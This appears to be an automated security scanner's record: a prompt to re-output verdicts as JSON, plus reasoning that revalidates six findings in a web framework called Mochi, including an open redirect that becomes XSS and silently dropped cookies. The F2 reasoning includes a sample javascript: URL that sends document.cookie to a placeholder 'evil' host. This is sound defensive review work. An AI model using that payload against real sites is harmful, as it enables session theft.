requested.title: Compile diagnostics reach production clients through `message`, bypassing the `development` gate that protects `stack`
jsonRedirect ships an unvalidated location to a client-side window.location.assign(), upgrading an app-level open redirect to same-origin XSS
staticDirs mounts serve dotfiles, diverging from the dotfile policy publicDir and Mochi.file both enforce
filterResponseHeaders silently collapses multiple Set-Cookie headers into one
transformPage replaces the body but copies Content-Length, ETag and Content-Encoding verbatim
publicRouteKey leaves Bun route-pattern metacharacters raw, so a public filename containing ':' or '*' registers a dynamic/wildcard route

rawResponses.prompt:
Your previous response was not valid JSON, so the scanner could not parse it.

Do not redo the revalidation and do not use tools. Re-output the same verdicts and reasoning from your previous response as ONLY one valid JSON array. No prose before or after. No "Confirmed:" preface. A ```json fenced block is acceptable, but the content inside must be valid JSON.

Keep string values compact. Escape double quotes inside strings as `\"`, escape newlines as `\n`, and do not put raw line breaks inside JSON string values.

Use this exact schema:

```json
[
  {
    "findingId": "the exact Finding ID from the finding, e.g. F3",
    "verdict": "true-positive",
    "adjustedSeverity": "HIGH",
    "duplicateOf": "Finding ID of the primary finding (only when verdict is duplicate)",
    "reasoning": "Detailed explanation. Show your work."
  }
]
```

Return exactly one verdict for every Finding ID below, copying each `findingId` exactly:

- F1 — "Compile diagnostics reach production clients through `message`, bypassing the `development` gate that protects `stack`"
- F2 — "jsonRedirect ships an unvalidated location to a client-side window.location.assign(), upgrading an app-level open redirect to same-origin XSS"
- F3 — "staticDirs mounts serve dotfiles, diverging from the dotfile policy publicDir and Mochi.file both enforce"
- F4 — "filterResponseHeaders silently collapses multiple Set-Cookie headers into one"
- F5 — "transformPage replaces the body but copies Content-Length, ETag and Content-Encoding verbatim"
- F6 — "publicRouteKey leaves Bun route-pattern metacharacters raw, so a public filename containing ':' or '*' registers a dynamic/wildcard route"

`verdict` must be one of `true-positive`, `false-positive`, `fixed`, `uncertain`, or `duplicate`. `adjustedSeverity` is optional and must be one of `CRITICAL`, `HIGH`, `MEDIUM`, `HIGH_BUG`, or `BUG` when present. `duplicateOf` is required only when `verdict` is `"duplicate"`; omit it otherwise.

parsedVerdicts.reasoning: The mechanism described is factually correct: renderErrorResponseInner gates `stack` on `development` (errors.ts:93-97) but passes `message` through unconditionally into the error page (L94, L101; DefaultError.svelte:22 renders it), routeErrorResponse (L120) copies a MochiHttpError's message verbatim, and Mochi.ts:900 throws MochiHttpError(500, formatCompileErrors(compileErrors)) with no mode check. What defeats the finding is that this is deliberate, not an oversight. packages/mochi/src/deferInHydratable.test.ts boots Mochi.serve({ development: false }) and asserts the response body contains 'mochi:defer inside a hydratable' plus the component names Leaf, HydrateParent and CombinedParent — the production-mode exposure of exactly these diagnostics is pinned by a test. The asymmetry with `stack` is also not accidental: Mochi.ts:743 shows the intended rule, `err instanceof MochiHttpError ? err.message : development && err instanceof Error ? err.message : 'Internal Server Error'` — a MochiHttpError's message is the framework's designated client-visible channel, and only non-MochiHttpError messages are mode-gated (same pattern at Mochi.ts:1639/1644 for island failures). Reachability is also thinner than claimed: `mochi-framework build` hard-fails on any non-empty registry.getErrors() for both pages and server islands (build.ts:199-202, 246-249), so a prebuilt production deploy cannot carry these errors, and the production-without-manifest path that compiles at boot is logged at error level as 'an unsupported configuration' (Mochi.ts:607-612). The residual path is a css-bundle-failed pushed by an on-demand island compile at request time (Mochi.ts:1612 compiles without re-checking errors), but an attacker cannot trigger that — it needs an operator-caused broken deploy, in which case every page is already 500ing. Finally, the disclosed content is component names and relForDisplay-normalized cwd-relative source paths and import specifiers, not secrets; formatBuildMessages also runs positions through relForDisplay. The one genuinely raw datum is css-bundle-failed's cssPath, which skips relForDisplay at ComponentRegistry.ts:274 and would print an absolute path — a nit-level hardening item, not a MEDIUM information-disclosure vulnerability.

Traced end-to-end and every link holds. redirect(status, location) (forms.ts:21-23) performs zero validation on `location`; a form action's redirect splits at Mochi.ts:1132-1141 into two transports; the enhanced branch calls jsonRedirect(result.status, result.location) which serializes the value verbatim (formsJson.ts:56-57), and the client sink is an unguarded window.location.assign(result.location) (enhance.client.ts:60-62), which is also the documented default (docs/74-use-enhance.md:55). The asymmetry is real: on the non-enhanced path the same string becomes a Location: response header (Mochi.ts:1137-1140), and browsers refuse to follow a javascript: or data: Location, so the app's bug stays an open redirect — whereas same-origin script calling location.assign('javascript:...') executes in the current document's origin, since the navigation initiator and the target document share an origin (the initiator-origin check browsers apply to javascript: URLs does not fire here). Top-level data: navigation is blocked, so javascript: is the live scheme. The comparison to SvelteKit is accurate — its action redirects route through goto, which rejects a target that is not same-origin. Concrete attack: an app with the ubiquitous `return redirect(303, String(formData.get('next')))` in a login action and a hidden `next` input seeded from page.url.searchParams, wrapped in {@attach enhance()} — a victim who follows /login?next=javascript:fetch('//evil/'+document.cookie) and submits gets attacker script executing on the site's origin; the identical app without enhance only gets a dead redirect. I confirmed no in-repo app is currently vulnerable (every redirect() call in site/demos/support uses a literal path, and data-loading/routes.ts:15 correctly wraps user input in encodeURIComponent inside a path segment), so this is a framework-hardening gap in a published library rather than a live exploit here. The fix belongs server-side in jsonRedirect/redirect() so both transports agree, plus a guard at the client sink. MEDIUM is the right tier: real XSS amplification, but it requires an app-level mistake to light up.

The primary claim is confirmed by the repository's own test. packages/mochi/src/staticDirs.test.ts writes .env containing SECRET=1 into the mounted tree (L14) and then asserts GET /assets/.env returns 200 (L101-104), with the comment 'Documented, not desired: Bun's directory route serves everything under the directory' — so the maintainers have empirically pinned the behavior and consider it a wart. resolveStaticDirs applies no content policy at all (only prefix shape, root-mount, metachar, assetPrefix, duplicate and stat checks), and registerStaticDirRoutes hands the directory to Bun as a native { dir } value (staticDirs.ts:57), where no dotfile notion exists. The divergence from the framework's own twice-implemented policy is real: isExcludedDotPath filters at scan time in publicDir.ts:14-27/54-58 (tests at publicDir.test.ts:36-56 assert .env and .git/config are skipped and only .well-known is allowed), and Mochi.file repeats the identical check at Mochi.ts:1480-1485 with a comment explicitly saying it matches the public-dir policy. I also verified the docs gap: the only warning callout for staticDirs (docs/160-serve-options.md:105-111) covers the request-pipeline bypass and says nothing about dotfiles, and grepping all of packages/docs turns up no dotfile statement for mounts. Traversal itself is genuinely handled (test L113-121 shows .., %2E%2E and %2F all 404), so the finding correctly scopes the issue to canonical dotfile segments. The feature is unreleased (VersionNote since=0.10.0), and it is aimed at exactly the trees most likely to hold a stray .env or a .git checkout, so the secure-default is worth adding before ship. One correction: the secondary symlink claim is overbroad — Bun's routing docs state the openat2(RESOLVE_IN_ROOT) rules are applied by Bun itself on macOS, FreeBSD, and on Linux without openat2; only on Windows does Bun 'follow symlinks wherever they lead'. The case-sensitivity caveat is accurate and is documented by Bun. Neither correction touches the dotfile finding.

Confirmed, including the runtime semantics the bug depends on. applyResolveOptions rebuilds the header set with filtered.set(name, value) while iterating result.headers.entries() (hooks.ts:185-197). Bun's own release notes settle that iteration yields separate set-cookie entries rather than comma-merging them — v0.5.9 ships the exact test new Headers([['Set-Cookie','foo=bar']]) + append('set-Cookie','foo=baz') yielding two ['set-cookie', ...] pairs from [...headers] (and v0.8.0 'Fix iterating headers with set-cookie'). So .set() overwrites each prior cookie and only the last survives; note the bug holds even under the other possible semantics, since a comma-merged set-cookie value re-set as one header also loses every cookie after the first at the browser's parser. The framework definitely produces multiple headers: finalizeCookieHeaders uses headers.append('Set-Cookie', ...) per cookie (cookies.ts:143-145). Reachability is confirmed at every claimed site and one more: Mochi.ts:1905 finalizes the jar before the filter on the protected fetch-fallback path; Mochi.ts:1907-1908 passes the user's fetch Response straight in; Mochi.ts:1128-1130 does the same for a form action's own Response; errors.ts:74-75 for a handleError Response; and Mochi.ts:1226-1227 for every Mochi.api handler's Response — an API route that appends a session cookie and a CSRF cookie silently ships only the second. Page/API routes using ctx.cookies are spared only by ordering (finalize at Mochi.ts:993 / 1242, after the middleware chain), which is luck, not design. The repo already owns the correct primitive — collectHeaderPairs() (utils/index.ts:102-115) exists precisely because getSetCookie() keeps the values separate — and applyResolveOptions simply doesn't use it. I verified the coverage claim: grepping all *.test.ts in the monorepo returns zero hits for filterResponseHeaders, transformPage, or applyResolveOptions, and no in-repo app uses filterResponseHeaders (support/src/embedHeaders.ts only mentions it in a comment explaining why it rebuilds the Response instead). Silent loss of Set-Cookie on a documented, example-ed middleware feature justifies HIGH_BUG.

Confirmed as a real latent defect, distinct from F4 (different lines, different mechanism — entity-header/body divergence rather than Set-Cookie collapse), so not a duplicate. hooks.ts:176-181 constructs the transformed Response with new Headers(result.headers), carrying every entity header across a body rewrite. The Content-Length half hinges on whether Bun honors an explicit value, and it does: Bun v1.1.43 added 'Override Content-Length and Transfer-Encoding in Bun.serve()' with the example new Response('Hello World', { headers: { 'Content-Length': '7' } }), and Mochi itself depends on that behavior for HEAD at Mochi.ts:1492-1493. The trigger is plausible: new Response(Bun.file('page.html')) populates Content-Length (Mochi.ts:1495 states this, and Bun's routing docs confirm automatic Content-Length/Content-Range for file bodies), its type is text/html so it enters the transform branch, and such a Response reaches applyResolveOptions from a fetch fallback (Mochi.ts:1908), a form action returning its own Response (1130), a handleError Response (errors.ts:75), or an API route (1227) — shipping a declared length that no longer matches the bytes. The ETag/Last-Modified half is unambiguous in code and matters most for transformPage's documented purpose: docs/125-transform-page.md:57 says to use it for request-dependent values only (nonces, A/B classes), so a per-request transform under an entity validator computed for the untransformed file is exactly the shape a shared cache mishandles. transformPage is live in all three deployed apps (shared/src/index.ts:23-29 analytics, site/src/index.ts:67 and :100, site/src/shot/routes.ts:33), though no in-repo handler currently returns an HTML Response carrying these headers, so the bug is latent rather than firing today. Two notes on the write-up: the in-repo precedents are real but only half-consistent — compress.ts:62-64 does copy headers and explicitly delete('Content-Length') because the body changed, and appendDebugTail bails on Content-Encoding (Mochi.ts:186-188), yet appendDebugTail then appends to the body while reusing response.headers verbatim (L198-202), i.e. it has the same Content-Length gap. And the Content-Encoding rationale ('result.text() has already decoded the body') only holds for a Response obtained from fetch(); for a locally-constructed pre-compressed body .text() does not decode, in which case the transform corrupts the compressed bytes instead. Either way transforming an encoded body is wrong. Confirmed zero test coverage for transformPage anywhere in the monorepo.

Every step checks out. publicRouteKey is bare encodeURI(urlPath) (publicDir.ts:35-37), and encodeURI by specification leaves : * ? # unescaped; publicDir.test.ts:86-90 deliberately pins that under-encoding to keep , ( ) literal, and nothing re-escapes afterwards. The result is used directly as a Bun route-pattern key at publicDir.ts:88/95, and Bun's routing docs define the pattern grammar and precedence as exact > :param > /prefix/* > global /* , so a public file named :id registers /:id — matching every single-segment URL no declared exact route claims — and one named * registers the global catch-all, which is precisely the failure staticDirs.ts:17-21 refuses a root mount to avoid ('answers every unmatched request with Bun's own 404 — shadowing the framework's error page, fetch fallback and asset routes'). The framework demonstrably knows these two characters are pattern syntax: isWarmablePattern rejects any pattern containing : or * for exactly this reason (warmup.ts:19-22). Neither guard can catch it, as claimed: the runtime check is the exact-string routeKey in routes (publicDir.ts:89), and the build-time collision check is the same exact-string comparison against both the raw and encoded form (cli/build.ts:129-135), so /:id never collides with a declared /login. Ordering is as described — user routes are registered first and public files are merged into the same bunRoutes object afterwards (Mochi.ts:1859). The security framing is the weakest part: registerPublicRoutes runs at boot and, in development only, from devWatcher.ts:737, so an upload-written filename needs a restart to take effect, and ? / # surviving merely makes a file unreachable. But the correctness defect is certain and easy to hit innocently — any ISO-8601-timestamped filename contains colons on a POSIX box — and the outcome is either a misrouted URL subtree or a boot-time pattern error. BUG is the right severity; the suggested post-encodeURI escaping of : * ? # still matches what browsers send for those characters in a path.
